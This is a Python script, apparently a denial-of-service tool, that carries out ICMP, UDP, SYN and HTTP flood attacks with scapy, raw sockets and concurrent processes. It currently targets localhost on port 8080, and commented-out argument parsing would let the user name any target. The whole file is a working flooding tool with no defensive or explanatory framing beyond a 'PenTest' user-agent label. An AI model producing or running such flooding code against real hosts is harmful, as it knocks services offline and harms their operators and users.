from scapy.all import IP, ICMP, TCP, send
import socket
from multiprocessing import Process
import requests
import sys

# Function to perform ICMP Flood
def send_icmp_echo_request(target_ip, num_packets):
    packets = [IP(dst=target_ip)/ICMP() for _ in range(num_packets)]
    send(packets, verbose=0)

# Function to perform UDP Flood
def udp_flood(target_ip, target_port, num_packets):
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    message = b"This is a UDP packet"
    for _ in range(num_packets):
        client.sendto(message, (target_ip, target_port))
    client.close()

# Function to perform SYN Flood
def syn_flood(target_ip, target_port, num_packets):
    packet = IP(dst=target_ip)/TCP(dport=target_port, flags="S")
    send(packet, count=num_packets)

# Function to send HTTP request
def send_request(target_url):
    headers = {'User-Agent': 'Mozilla/5.0 (compatible; PenTest/1.0)'}
    requests.get(target_url, headers=headers)

# Function to perform HTTP Flood with concurrent processes
def http_flood_concurrent(target_url, num_processes):
    processes = []
    for _ in range(num_processes):
        p = Process(target=send_request, args=(target_url,))
        p.start()
        processes.append(p)
    for p in processes:
        p.join()

# Main function to parse command-line arguments and call the appropriate flood function
if __name__ == "__main__":
    # Updated code for local testing
    target_ip = '127.0.0.1'
    target_port = 8080
    target_url = 'http://localhost:8080/'
    num_packets = 10000
    num_processes = 10000

    print("Choose one of the following attack type. Supported types are: icmp, udp, syn, http")
    attack_type = input()

    # if len(sys.argv) < 1:
    #     print("Usage: script.py <attack_type> <target_ip/target_url> [additional arguments]")
    #     sys.exit(1)
    
    # attack_type = sys.argv[1]
    # target = sys.argv[2]
    
    if attack_type.lower() == 'icmp':
        # if len(sys.argv) != 4:
        #     print("Usage: script.py icmp <target_ip> <num_packets>")
        #     sys.exit(1)
        send_icmp_echo_request(target_ip, num_packets)
    
    elif attack_type.lower() == 'udp':
        # if len(sys.argv) != 5:
        #     print("Usage: script.py udp <target_ip> <target_port> <num_packets>")
        #     sys.exit(1)
        udp_flood(target_ip, target_port, num_packets)
    
    elif attack_type.lower() == 'syn':
        # if len(sys.argv) != 5:
        #     print("Usage: script.py syn <target_ip> <target_port> <num_packets>")
        #     sys.exit(1)
        syn_flood(target_ip, target_port, num_packets)
    
    elif attack_type.lower() == 'http':
        # if len(sys.argv) != 4:
        #     print("Usage: script.py http <target_url> <num_processes>")
        #     sys.exit(1)
        http_flood_concurrent(target_url, num_processes)
    
    else:
        print("Unknown attack type. Supported types are: icmp, udp, syn, http")
        sys.exit(1)
